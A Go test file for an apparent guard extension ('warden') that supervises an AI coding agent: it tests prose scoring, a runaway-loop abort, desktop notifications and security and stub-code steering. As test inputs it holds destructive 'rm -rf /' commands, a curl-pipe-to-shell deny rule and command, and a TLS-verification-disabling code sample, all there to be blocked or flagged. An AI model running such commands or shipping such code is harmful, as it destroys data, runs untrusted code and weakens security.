package warden

import (
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"sync"
	"testing"
	"time"
)

// Layer-1 tests of the security lane's wiring: the prose check and restatement at agent_end, the runaway guard on
// the assistant stream, and desktop notifications.

func (h *harness) newPrompt(prompt string) {
	h.say("user", prompt)
	h.host.Fire("before_agent_start", map[string]any{"prompt": prompt, "systemPromptOptions": map[string]any{}})
	h.host.Fire("agent_start", nil)
}

func (h *harness) agentEnd(text string) {
	h.host.Fire("agent_end", map[string]any{"messages": []any{map[string]any{"role": "assistant", "stopReason": "stop", "content": []any{map[string]any{"type": "text", "text": text}}}}})
}

// lastLine is the newest trace line of a guard.
func (h *harness) lastLine(guard GuardName) string {
	entries := h.w.trace.Entries()
	for i := len(entries) - 1; i >= 0; i-- {
		if entries[i].Guard == guard {
			return entries[i].Line
		}
	}
	return ""
}

func (h *harness) aborts() int { return len(h.host.CallsTo("abort")) }

func (h *harness) judgeRequests(question string) int {
	n := 0
	for _, r := range h.ts.reqs() {
		if qs, _ := r.Body["questions"].(map[string]any); qs != nil {
			if _, ok := qs[question]; ok {
				n++
			}
		}
	}
	return n
}

func securityConfig(change func(*Config)) *Config {
	c := on(BackendTypeSafe)
	c.Notices = true
	if change != nil {
		change(c)
	}
	return c
}

func (h *harness) reconfigure(c *Config) {
	h.t.Helper()
	if err := SaveConfig(ConfigPath(h.home), *c); err != nil {
		h.t.Fatal(err)
	}
	h.start()
}

// twin: tests/extension.test.ts:1880
func TestProseFinalReplyIsScoredAndTheAgentNudgedOnATrend(t *testing.T) {
	h := startHarness(t, harnessOpts{cfg: securityConfig(nil)})
	h.start()
	h.newPrompt("explain the bug")
	h.ts.set(map[string]float64{"wordy": 0.9, "cliches": 0.95, "jargon": 0.1})
	longReply := strings.Repeat("Great question! Let me walk you through it. ", 6)
	h.agentEnd(longReply)
	reqs := h.ts.reqs()
	last := reqs[len(reqs)-1]
	qs, _ := last.Body["questions"].(map[string]any)
	if len(qs) != 3 || qs["wordy"] == nil || qs["cliches"] == nil || qs["jargon"] == nil {
		t.Fatalf("questions %v", qs)
	}
	state, _ := last.Body["state"].(map[string]any)
	if state["audience"] != "a software developer who knows this codebase and its tools" {
		t.Fatalf("audience %v", state["audience"])
	}
	if len(h.steers()) != 0 {
		t.Fatal("one reply is not a trend")
	}
	if got := h.lastLine(GuardProse); got != "warden · prose · wordy 0.90 · clichés 0.95 · jargon 0.10 · cliches, wordy" {
		t.Fatalf("strongest symptom first: %q", got)
	}

	h.newPrompt("and the fix?")
	h.agentEnd(longReply)
	steers := h.steers()
	if len(steers) != 1 || steers[0].Options["deliverAs"] != "nextTurn" {
		t.Fatalf("two of the last three replies: nudge: %+v", steers)
	}
	if !regexp.MustCompile(`longer than the content needs[\s\S]*assistant clichés[\s\S]*From the next reply on, lead with the answer`).MatchString(steers[0].Content) {
		t.Fatalf("nudge %q", steers[0].Content)
	}
	if got := h.lastLine(GuardProse); !strings.HasPrefix(got, "warden · prose · wordy 0.90") {
		t.Fatalf("the nudge is a warning: prose keeps its own line: %q", got)
	}
	notices := h.notices()
	if len(notices) == 0 || !strings.Contains(notices[len(notices)-1], "warden · prose: wordy, cliches in 2 of the last 3 replies") {
		t.Fatalf("notices %v", notices)
	}

	h.newPrompt("ok")
	h.agentEnd(longReply)
	if len(h.steers()) != 1 {
		t.Fatal("cool-down after a nudge")
	}
	h.newPrompt("short one")
	h.agentEnd("Short.")
	if n := h.judgeRequests("wordy"); n != 3 {
		t.Fatalf("replies under minChars are not judged: %d", n)
	}

	plain := securityConfig(func(c *Config) { c.Slop.Prose.Audience = "plain" })
	h.reconfigure(plain)
	h.newPrompt("status?")
	h.ts.set(map[string]float64{"wordy": 0.1, "cliches": 0.1, "jargon": 0.95})
	h.agentEnd(strings.Repeat("The webhook handler lacked HMAC verification so the ORM upsert raced the mutex. ", 3))
	reqs = h.ts.reqs()
	state, _ = reqs[len(reqs)-1].Body["state"].(map[string]any)
	if state["audience"] != "a non-programmer who owns the product and reads the reply as a status update" {
		t.Fatalf("audience %v", state["audience"])
	}
}

func TestProseSharesTheRoundTripWithTheDoneCheckAndDoesNotNeedIt(t *testing.T) {
	// With the done-check off, the prose check still runs; with prose off, the done check does.
	h := startHarness(t, harnessOpts{cfg: securityConfig(func(c *Config) { c.Done.Enabled = false })})
	h.start()
	h.newPrompt("explain")
	h.agentEnd(strings.Repeat("Certainly! Here is a long enough reply to be scored by the prose check. ", 4))
	if h.judgeRequests("wordy") != 1 {
		t.Fatal("prose did not run with the done-check off")
	}
	h2 := startHarness(t, harnessOpts{cfg: securityConfig(func(c *Config) { c.Slop.Prose.Enabled = false })})
	h2.start()
	h2.host.Fire("agent_start", nil)
	h2.toolResult("edit", map[string]any{"path": "a.go"}, "ok", false)
	h2.agentEnd("Fixed it, all done. " + strings.Repeat("More words. ", 30))
	if h2.judgeRequests("wordy") != 0 || h2.judgeRequests("claims_done") != 1 {
		t.Fatalf("prose %d done %d", h2.judgeRequests("wordy"), h2.judgeRequests("claims_done"))
	}
}

func TestAFailedProseCheckIsReportedAndDoesNotCountTowardTheTrend(t *testing.T) {
	h := startHarness(t, harnessOpts{cfg: securityConfig(nil)})
	h.start()
	h.newPrompt("explain")
	h.ts.status = 500
	h.agentEnd(strings.Repeat("Great question! Let me walk you through it. ", 6))
	if got := h.lastLine(GuardProse); !strings.Contains(got, "typesafe error") {
		t.Fatalf("a failed check is recorded: %q", got)
	}
	if len(h.steers()) != 0 {
		t.Fatal("a failure nudges nothing")
	}
}

const restatedDone = "CON-375 done: draft PR 2688 is pushed with code, tests and screenshots, and Linear is In Review. Worktree millia-con375 awaits review."

func TestARestatingFinalReplyIsRecordedNeverSteered(t *testing.T) {
	h := startHarness(t, harnessOpts{cfg: securityConfig(func(c *Config) { c.Slop.Prose.Enabled = false })})
	h.start()
	h.newPrompt("wrap up")
	h.agentEnd(restatedDone)
	if h.lastLine(GuardProse) != "" {
		t.Fatal("a first reply never restates")
	}
	h.agentEnd("CON-375 is complete: the draft pull request 2688 is pushed together with code, tests and screenshots, and Linear sits In Review. The worktree millia-con375 now awaits review.")
	if got := h.lastLine(GuardProse); !strings.HasPrefix(got, "warden · prose · restated ") || !strings.HasSuffix(got, " · recorded only") {
		t.Fatalf("restatement line %q", got)
	}
	if len(h.steers()) != 0 {
		t.Fatal("restatement is recorded only")
	}
	if n := h.notices(); len(n) == 0 || !strings.Contains(n[len(n)-1], "warden · prose: the final reply restates") {
		t.Fatalf("notices %v", n)
	}
	// A new prompt clears the window: answering the user is never a restatement.
	h.newPrompt("anything else?")
	before := len(h.w.trace.Entries())
	h.agentEnd(restatedDone)
	if len(h.w.trace.Entries()) != before {
		t.Fatal("a new prompt starts a new window")
	}
}

// --- runaway --------------------------------------------------------------------------------------------------

const runawayLoop = "Stop. PR green. Merge. Executing:\n\n```bash\ngh pr merge 1234 --merge\n```\n\n"

// streamReply streams text to the extension in five-character deltas until it aborts the run (the count of aborts
// before this reply is abortsBefore).
func (h *harness) streamReply(text, kind string, abortsBefore int) {
	h.host.Fire("message_start", map[string]any{"message": map[string]any{"role": "assistant", "content": []any{}}})
	h.host.Fire("message_update", map[string]any{"message": map[string]any{}, "assistantMessageEvent": map[string]any{"type": kind + "_start", "contentIndex": 0}})
	units := []rune(text)
	for i := 0; i < len(units) && h.aborts() == abortsBefore; i += 5 {
		end := min(i+5, len(units))
		h.host.Fire("message_update", map[string]any{"message": map[string]any{}, "assistantMessageEvent": map[string]any{"type": kind + "_delta", "contentIndex": 0, "delta": string(units[i:end])}})
	}
}

// twin: tests/extension.test.ts:1974
func TestRunawayGuardAbortsRecoversOnceAndNeedsNoTypeSafe(t *testing.T) {
	h := startHarness(t, harnessOpts{cfg: securityConfig(func(c *Config) { c.SteerVisible = false })})
	h.start()
	h.newPrompt("merge the PR once it is green")
	h.streamReply(strings.Repeat(runawayLoop, 30), "text", 0)
	if h.aborts() != 1 {
		t.Fatalf("the run is aborted before the loop finishes: %d", h.aborts())
	}
	if h.ts.count() != 0 {
		t.Fatal("code only: nothing is sent to TypeSafe")
	}
	if got := h.lastLine(GuardRunaway); !regexp.MustCompile(`^warden · runaway · text · \d+× repeated · \d+ chars · block · stopped, recovering$`).MatchString(got) {
		t.Fatalf("runaway line %q", got)
	}
	n := h.notices()
	if !regexp.MustCompile(`warden · runaway: the same text block repeated \d+ times .* run stopped \(agent gets one follow-up turn\)`).MatchString(n[len(n)-1]) {
		t.Fatalf("notice %q", n[len(n)-1])
	}
	if notes := h.host.CallsTo("ui.notify"); notes[len(notes)-1].Args["level"] != "error" {
		t.Fatalf("level %v", notes[len(notes)-1].Args["level"])
	}
	if len(h.steers()) != 0 {
		t.Fatal("the follow-up waits for agent_end so Pi can restore queued user messages first")
	}
	// Pi ends the aborted run; the follow-up queued here starts the recovery turn.
	h.host.Fire("agent_end", map[string]any{"messages": []any{
		map[string]any{"role": "user", "content": "merge the PR once it is green"},
		map[string]any{"role": "assistant", "stopReason": "aborted", "content": []any{map[string]any{"type": "text", "text": strings.Repeat(runawayLoop, 6)}}},
	}})
	steers := h.steers()
	if len(steers) != 1 || steers[0].Options["deliverAs"] != "followUp" || steers[0].Options["triggerTurn"] != true {
		t.Fatalf("recovery %+v", steers)
	}
	if !steers[0].Display {
		t.Fatal("the user sees why the agent restarted, even with steers hidden")
	}
	if !regexp.MustCompile(`pi-warden stopped your reply: the same text block repeated \d+ times \(".*"\) and no tool was called\. Do not restate`).MatchString(steers[0].Content) {
		t.Fatalf("nudge %q", steers[0].Content)
	}

	h.host.Fire("agent_start", nil) // the recovery turn begins
	// The recovery turn loops again: stop it, but do not restart a second time for this prompt.
	h.streamReply(strings.Repeat(runawayLoop, 30), "text", 1)
	if h.aborts() != 2 {
		t.Fatalf("aborts %d", h.aborts())
	}
	if got := h.lastLine(GuardRunaway); !regexp.MustCompile(`^warden · runaway · text · \d+× repeated · \d+ chars · block · stopped$`).MatchString(got) {
		t.Fatalf("the second stop does not recover: %q", got)
	}
	n = h.notices()
	if !strings.Contains(n[len(n)-1], "not restarted: second time for this prompt") {
		t.Fatalf("notice %q", n[len(n)-1])
	}
	h.host.Fire("agent_end", map[string]any{"messages": []any{map[string]any{"role": "assistant", "stopReason": "aborted", "content": []any{map[string]any{"type": "text", "text": strings.Repeat(runawayLoop, 6)}}}}})
	steers = h.steers()
	if len(steers) != 2 || steers[1].Options["triggerTurn"] == true || !strings.Contains(steers[1].Content, "not restarted. Wait for the user.") {
		t.Fatalf("appended as context for the next prompt, no new turn: %+v", steers)
	}

	// Ordinary long replies stream through untouched; a new prompt makes recovery available again.
	h.newPrompt("explain the merge")
	var paragraphs []string
	for i := range 40 {
		paragraphs = append(paragraphs, "Paragraph "+itoaInt(i)+" explains one distinct part of the merge process in its own words.")
	}
	h.streamReply(strings.Join(paragraphs, "\n\n"), "text", 2)
	if h.aborts() != 2 {
		t.Fatal("distinct paragraphs are not a runaway")
	}
	h.streamReply(strings.Repeat(runawayLoop, 30), "text", 2)
	if h.aborts() != 3 || !strings.Contains(h.lastLine(GuardRunaway), "stopped, recovering") {
		t.Fatalf("a new prompt makes recovery available again: %d %q", h.aborts(), h.lastLine(GuardRunaway))
	}
	h.host.Fire("agent_end", map[string]any{"messages": []any{map[string]any{"role": "assistant", "stopReason": "aborted", "content": []any{map[string]any{"type": "text", "text": runawayLoop}}}}})
	if s := h.steers(); len(s) != 3 || s[2].Options["deliverAs"] != "followUp" || s[2].Options["triggerTurn"] != true {
		t.Fatalf("third recovery %+v", s)
	}
	h.host.Fire("agent_start", nil) // the recovery turn begins

	// Thinking has a higher threshold.
	h.newPrompt("think about it")
	h.streamReply(strings.Repeat(runawayLoop, 8), "thinking", 3)
	if h.aborts() != 3 {
		t.Fatal("8 repeats in thinking is drafting, not a runaway")
	}
	h.streamReply(strings.Repeat(runawayLoop, 30), "thinking", 3)
	if h.aborts() != 4 || !regexp.MustCompile(`^warden · runaway · thinking · \d+× repeated.* · stopped, recovering$`).MatchString(h.lastLine(GuardRunaway)) {
		t.Fatalf("thinking stop %d %q", h.aborts(), h.lastLine(GuardRunaway))
	}
	h.host.Fire("agent_end", map[string]any{"messages": []any{}, "stopReason": "aborted"})

	// Recovery off: stopped, not stopped, recovering, and no turn.
	h.reconfigure(securityConfig(func(c *Config) { c.Runaway.Recover = false }))
	h.newPrompt("merge again")
	h.streamReply(strings.Repeat(runawayLoop, 30), "text", 4)
	if h.aborts() != 5 || !strings.HasSuffix(h.lastLine(GuardRunaway), " · stopped") {
		t.Fatalf("recovery off: %d %q", h.aborts(), h.lastLine(GuardRunaway))
	}
	h.host.Fire("agent_end", map[string]any{"messages": []any{}})
	if s := h.steers(); s[len(s)-1].Options["triggerTurn"] == true {
		t.Fatal("recovery off starts no turn")
	}
	// Disabled: the stream is left alone.
	h.reconfigure(securityConfig(func(c *Config) { c.Runaway.Enabled = false }))
	h.newPrompt("merge once more")
	h.streamReply(strings.Repeat(runawayLoop, 30), "text", 5)
	if h.aborts() != 5 {
		t.Fatal("disabled: the stream is left alone")
	}
}

func TestRunawayIsIgnoredWhileWardenIsOffAndOnOtherRoles(t *testing.T) {
	h := startHarness(t, harnessOpts{cfg: func() *Config { c := DefaultConfig(); return &c }()})
	h.start()
	h.streamReply(strings.Repeat(runawayLoop, 30), "text", 0)
	if h.aborts() != 0 {
		t.Fatal("warden is off")
	}
	h2 := startHarness(t, harnessOpts{cfg: securityConfig(nil)})
	h2.start()
	h2.host.Fire("message_update", map[string]any{"message": map[string]any{}}) // no assistantMessageEvent
	h2.host.Fire("message_start", map[string]any{"message": map[string]any{"role": "user"}})
	if h2.aborts() != 0 {
		t.Fatal("nothing to judge")
	}
}

// --- desktop notifications ---------------------------------------------------------------------------------------

type notifyCall struct {
	File string
	Args []string
	Env  map[string]string
}

type notifyLog struct {
	mu    sync.Mutex
	calls []notifyCall
	// answer decides the probes' exit; nil answers true.
	answer func(file string) bool
}

func (n *notifyLog) run(file string, args []string, _ time.Duration, env map[string]string) bool {
	n.mu.Lock()
	n.calls = append(n.calls, notifyCall{file, append([]string(nil), args...), env})
	answer := n.answer
	n.mu.Unlock()
	return answer == nil || answer(file)
}

func (n *notifyLog) get() []notifyCall {
	n.mu.Lock()
	defer n.mu.Unlock()
	return append([]notifyCall(nil), n.calls...)
}

func notifyHarness(t *testing.T, log *notifyLog, noUI bool, change func(*Config)) *harness {
	c := securityConfig(func(c *Config) {
		c.Notify = NotifyConfig{Enabled: true, CooldownMs: 0, Command: []string{"notify-it", "{body}"}}
		c.Backend, c.Consent = BackendNone, BackendNone
		if change != nil {
			change(c)
		}
	})
	return startHarness(t, harnessOpts{cfg: c, noUI: noUI, tweak: func(o *Options) { o.NotifyRunner = log.run; o.NotifierPlatform = "linux" }})
}

func (h *harness) settleNotifications() { h.w.sec.sending.Wait() }

// twin: tests/extension.test.ts:2049
func TestDesktopNotificationsForAHoldAConfirmAndARunawayStop(t *testing.T) {
	forcePush := map[string]any{"command": "rm -rf /"}
	// Off by default: a command configured without `enabled: true` reaches nobody.
	log := &notifyLog{}
	h := notifyHarness(t, log, false, func(c *Config) { c.Notify.Enabled = false })
	h.start()
	h.newPrompt("clean up")
	if _, held := blocked(h.toolCall("bash", "c1", forcePush)); !held {
		t.Fatal("recursive rm not held")
	}
	h.settleNotifications()
	if len(log.get()) != 0 {
		t.Fatal("notifications are opt-in")
	}

	// A hold.
	log = &notifyLog{}
	h = notifyHarness(t, log, false, nil)
	h.start()
	h.newPrompt("clean up")
	if _, held := blocked(h.toolCall("bash", "c1", forcePush)); !held {
		t.Fatal("recursive rm not held")
	}
	h.settleNotifications()
	calls := log.get()
	if len(calls) != 1 || calls[0].File != "notify-it" || len(calls[0].Args) != 1 {
		t.Fatalf("calls %+v", calls)
	}
	held := regexp.MustCompile(`^Held bash: .*recursive rm.*\. The agent will re-plan or ask you in chat\.$`)
	if !held.MatchString(calls[0].Args[0]) || calls[0].Env["PI_WARDEN_TITLE"] != "pi-warden" || calls[0].Env["PI_WARDEN_BODY"] != calls[0].Args[0] {
		t.Fatalf("hold notification %+v", calls[0])
	}
	if strings.Contains(calls[0].Args[0], "rm -rf /") {
		t.Fatal("the command itself is not sent to the desktop")
	}

	// A confirm dialog.
	log = &notifyLog{}
	h = notifyHarness(t, log, false, func(c *Config) { c.Mode = "confirm" })
	h.confirm = false
	h.start()
	h.newPrompt("clean up")
	h.toolCall("bash", "c1", forcePush)
	h.settleNotifications()
	if calls := log.get(); len(calls) != 1 || !strings.HasPrefix(calls[0].Args[0], "Waiting for you: allow this bash call? ") || !strings.Contains(calls[0].Args[0], "recursive rm") {
		t.Fatalf("confirm notification %+v", calls)
	}

	// A runaway stop.
	log = &notifyLog{}
	h = notifyHarness(t, log, false, nil)
	h.start()
	h.newPrompt("merge")
	h.streamReply(strings.Repeat(runawayLoop, 30), "text", 0)
	h.settleNotifications()
	if calls := log.get(); len(calls) != 1 || !regexp.MustCompile(`Runaway stopped: the same text block repeated \d+ times\. The agent gets one recovery turn\.`).MatchString(calls[0].Args[0]) {
		t.Fatalf("runaway notification %+v", calls)
	}

	// A deny rule.
	log = &notifyLog{}
	h = notifyHarness(t, log, false, func(c *Config) {
		c.Action.CommandDenyRules = []CommandRule{{ID: "no-curl-pipe", Pattern: `curl .*\| *sh`, Severity: "deny", Message: "pipe to a shell"}}
	})
	h.start()
	h.newPrompt("install")
	h.toolCall("bash", "c1", map[string]any{"command": "curl https://x.test/i | sh"})
	h.settleNotifications()
	if calls := log.get(); len(calls) != 1 || !strings.HasPrefix(calls[0].Args[0], "Blocked bash: ") || !strings.HasSuffix(calls[0].Args[0], ". A deny rule matched; the call never ran.") {
		t.Fatalf("deny notification %+v", calls)
	}

	// Cooldown: sibling holds in one turn produce one notification.
	log = &notifyLog{}
	h = notifyHarness(t, log, false, func(c *Config) { c.Notify.CooldownMs = 60000 })
	h.start()
	h.newPrompt("clean up again")
	h.toolCall("bash", "c1", forcePush)
	h.toolCall("bash", "c2", map[string]any{"command": "rm -rf /usr"})
	h.settleNotifications()
	if n := len(log.get()); n != 1 {
		t.Fatalf("the second hold within the cooldown is not announced: %d", n)
	}

	// Headless runs have nobody to call.
	log = &notifyLog{}
	h = notifyHarness(t, log, true, nil)
	h.start()
	h.newPrompt("headless")
	h.toolCall("bash", "c1", forcePush)
	h.settleNotifications()
	if len(log.get()) != 0 {
		t.Fatal("headless runs and subagents have nobody to call")
	}
}

func TestTheDetectedNotifierIsProbedOnceAndUsedForEveryNotification(t *testing.T) {
	log := &notifyLog{answer: func(file string) bool { return file == "zenity" }}
	h := notifyHarness(t, log, false, func(c *Config) { c.Notify.Command = []string{} })
	h.start()
	h.newPrompt("clean up")
	h.toolCall("bash", "c1", map[string]any{"command": "rm -rf /"})
	h.settleNotifications()
	h.toolCall("bash", "c2", map[string]any{"command": "rm -rf /"})
	h.settleNotifications()
	var files []string
	for _, c := range log.get() {
		files = append(files, c.File)
	}
	want := []string{"notify-send", "dunstify", "gdbus", "kdialog", "zenity", "zenity", "zenity"}
	if strings.Join(files, ",") != strings.Join(want, ",") {
		t.Fatalf("probe once, then send each time: %v", files)
	}
	// /warden status names the notifier.
	h.host.Command("warden", "status")
	msgs := h.messages()
	if status := msgs[len(msgs)-1].Content; !strings.Contains(status, "Desktop notifications: on (zenity; cooldown 0 ms).") {
		t.Fatalf("status %q", status)
	}
}

func TestNoNotifierOnThisMachineIsSilent(t *testing.T) {
	log := &notifyLog{answer: func(string) bool { return false }}
	h := notifyHarness(t, log, false, func(c *Config) { c.Notify.Command = []string{} })
	h.start()
	h.newPrompt("clean up")
	h.toolCall("bash", "c1", map[string]any{"command": "rm -rf /"})
	h.settleNotifications()
	for _, c := range log.get() {
		if c.File == "notify-it" || len(c.Env) > 0 {
			t.Fatalf("nothing is sent when no probe answers: %+v", c)
		}
	}
	if got := h.w.notificationsStatus(h.w.cfg); got != "Desktop notifications: on (no notifier found on this machine; cooldown 0 ms)." {
		t.Fatal(got)
	}
}

// --- security-write and slop -------------------------------------------------------------------------------------

// twin: tests/extension.test.ts:757
func TestSecurityWeaknessesInWrittenContentShareTheActionRequestAndSteer(t *testing.T) {
	h := startHarness(t, harnessOpts{cfg: securityConfig(nil)})
	h.ts.set(map[string]float64{"security_risk": 0.95})
	h.say("user", "make the client work")
	h.start()
	h.toolCall("write", "c1", map[string]any{"path": filepath.Join(h.cwd, "client.ts"), "content": "const agent = new Agent({ rejectUnauthorized: false });"})
	if h.ts.count() != 1 {
		t.Fatalf("the security question rides the action request: %d requests", h.ts.count())
	}
	steers := h.steers()
	if len(steers) == 0 || !strings.Contains(steers[0].Content, "security weakness") || steers[0].Options["deliverAs"] != "steer" {
		t.Fatalf("steers %+v", steers)
	}
	found := false
	for _, n := range h.notices() {
		found = found || strings.Contains(n, "security weakness")
	}
	if !found {
		t.Fatalf("notices %v", h.notices())
	}
	// Below the threshold, or with the security guard off, nothing is said.
	h2 := startHarness(t, harnessOpts{cfg: securityConfig(func(c *Config) { c.Security.Enabled = false })})
	h2.ts.set(map[string]float64{"security_risk": 0.95})
	h2.say("user", "make the client work")
	h2.start()
	h2.toolCall("write", "c1", map[string]any{"path": filepath.Join(h2.cwd, "client.ts"), "content": "x"})
	if len(h2.steers()) != 0 {
		t.Fatal("security.enabled false asks nothing and says nothing")
	}
}

func TestSecurityWriteSteerIsASteerOfItsOwnAndWatchedByKind(t *testing.T) {
	h := startHarness(t, harnessOpts{cfg: securityConfig(nil)})
	adaptor := &recordingAdaptor{}
	h.w.adaptor = adaptor
	h.ts.set(map[string]float64{"security_risk": 0.95})
	h.say("user", "make the client work")
	h.start()
	h.toolCall("write", "c1", map[string]any{"path": filepath.Join(h.cwd, "client.ts"), "content": "x"})
	if len(adaptor.added) != 1 || len(adaptor.added[0].kinds) != 1 || adaptor.added[0].kinds[0] != SteerKindSecurityWrite || adaptor.added[0].subject.Path == "" {
		t.Fatalf("watched %+v", adaptor.added)
	}
}

// twin: tests/extension.test.ts:1635
// (steers are shown by default in the port, so the twin sets steerVisible false to read the original's default.)
func TestSlopSymptomsSteerAfterTheWriteWithoutHoldingAndEscalateOnRepeats(t *testing.T) {
	h := startHarness(t, harnessOpts{cfg: securityConfig(func(c *Config) { c.SteerVisible = false })})
	h.ts.set(map[string]float64{"irreversible": 0.05, "off_task": 0.05, "should_proceed": 0.95, "slop_stub": 0.92, "slop_hedging": 0.75, "slop_comments": 0.1, "slop_dead": 0.1})
	h.say("user", "write the module")
	h.start()
	write := func(id, name string) map[string]any {
		return h.toolCall("write", id, map[string]any{"path": filepath.Join(h.cwd, "src", name), "content": "// TODO: implement\nexport const a = () => null;"})
	}
	if r := write("c1", "a.ts"); r != nil {
		t.Fatalf("slop never holds: %v", r)
	}
	reqs := h.ts.reqs()
	qs, _ := reqs[len(reqs)-1].Body["questions"].(map[string]any)
	var ids []string
	for id := range qs {
		ids = append(ids, id)
	}
	sort.Strings(ids)
	if got := strings.Join(ids, ","); got != "irreversible,mutates,off_task,scope,security_risk,should_proceed,slop_comments,slop_dead,slop_hedging,slop_stub" {
		t.Fatalf("questions %s", got)
	}
	steers := h.steers()
	if len(steers) != 1 || steers[0].Display || steers[0].Options["deliverAs"] != "steer" {
		t.Fatalf("hidden from the transcript, delivered as a steer: %+v", steers)
	}
	if !strings.Contains(steers[0].Content, "src/a.ts has stub or placeholder code where a working implementation is needed; hedging or vague notes. Fix it in your next edit: replace stubs") {
		t.Fatalf("steer %q", steers[0].Content)
	}
	if n := h.notices(); !regexp.MustCompile(`warden · slop · src/a\.ts`).MatchString(n[len(n)-1]) {
		t.Fatalf("notices %v", n)
	}
	// The original also asserts the widget chip carries `slop: stub 0.92, hedging 0.75`; the port draws its action
	// line in steer.go traceLine, which names no slop scores (guard core / widget lane), so that assertion is not carried.

	h.ts.set(map[string]float64{"irreversible": 0.05, "off_task": 0.05, "should_proceed": 0.95, "slop_stub": 0.1, "slop_hedging": 0.1, "slop_comments": 0.1, "slop_dead": 0.1})
	h.toolCall("edit", "c2", map[string]any{"path": filepath.Join(h.cwd, "src", "a.ts"), "edits": []any{map[string]any{"oldText": "a", "newText": "b"}}})
	if len(h.steers()) != 1 {
		t.Fatal("clean content: no steer")
	}

	h.ts.set(map[string]float64{"irreversible": 0.05, "off_task": 0.05, "should_proceed": 0.95, "slop_stub": 0.9, "slop_hedging": 0.1, "slop_comments": 0.1, "slop_dead": 0.1})
	write("c3", "b.ts")
	write("c4", "c.ts")
	steers = h.steers()
	if len(steers) != 3 || !regexp.MustCompile(`\(3th time this session\)[\s\S]*standing rule`).MatchString(steers[2].Content) {
		t.Fatalf("repeats escalate: %+v", steers)
	}

	visible := securityConfig(func(c *Config) { c.SteerVisible = true; c.SteerBudget = 0 })
	h.reconfigure(visible)
	write("c5", "d.ts")
	if steers = h.steers(); len(steers) != 4 || !steers[3].Display {
		t.Fatalf("steerVisible: %+v", steers)
	}
}

func TestASlopSteerWaitsForTheCallToProceed(t *testing.T) {
	// A held write never lands, so its slop note is dropped: a rm -rf hold carries no steer about content.
	h := startHarness(t, harnessOpts{cfg: securityConfig(nil)})
	h.ts.set(map[string]float64{"irreversible": 0.95, "slop_stub": 0.92})
	h.say("user", "clean up")
	h.start()
	h.toolCall("write", "c1", map[string]any{"path": filepath.Join(h.cwd, "src", "a.ts"), "content": "// TODO: implement"})
	for _, s := range h.steers() {
		if strings.Contains(s.Content, "the content just written") {
			t.Fatalf("a held write got a slop steer: %q", s.Content)
		}
	}
}

func TestSlopSteerTextNamesEachSymptomAndItsFix(t *testing.T) {
	got := SlopSteer("a.ts, b.ts", []string{"dead", "comments"}, map[string]int{"dead": 3, "comments": 1})
	want := "pi-warden: the content just written to a.ts, b.ts has dead or duplicated code (3th time this session); comments that restate the code. Fix it in your next edit: " + SlopFixes["dead"] + "; " + SlopFixes["comments"] + ". Treat this as a standing rule for the rest of the session."
	if got != want {
		t.Fatalf("%q", got)
	}
}

// recordingAdaptor records what the guards ask to watch, with the subject.
type recordingAdaptor struct {
	sendAllAdaptor
	added []watched
}

type watched struct {
	kinds   []SteerKind
	subject SteerSubject
}

func (r *recordingAdaptor) add(_ string, kinds []SteerKind, subject SteerSubject, _ bool) {
	r.added = append(r.added, watched{kinds, subject})
}
